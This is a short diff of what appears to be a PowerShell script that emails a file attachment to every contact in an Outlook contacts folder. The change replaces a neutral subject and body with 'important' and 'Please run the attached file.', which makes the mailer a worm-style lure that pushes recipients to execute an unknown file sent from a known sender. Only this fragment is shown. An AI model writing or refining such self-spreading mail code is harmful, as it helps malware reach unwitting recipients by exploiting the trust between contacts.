@@ -45,8 +45,8 @@ foreach ($contact in $contactsFolder.Items) {
             }
             
             # Subject and body of the email
-            $mail.Subject = "Email with attachment"
-            $mail.Body = "Please find the attached file."
+            $mail.Subject = "important"
+            $mail.Body = "Please run the attached file."
             
             # Attach the file
             $attachment = $mail.Attachments.Add($fileToAttach)
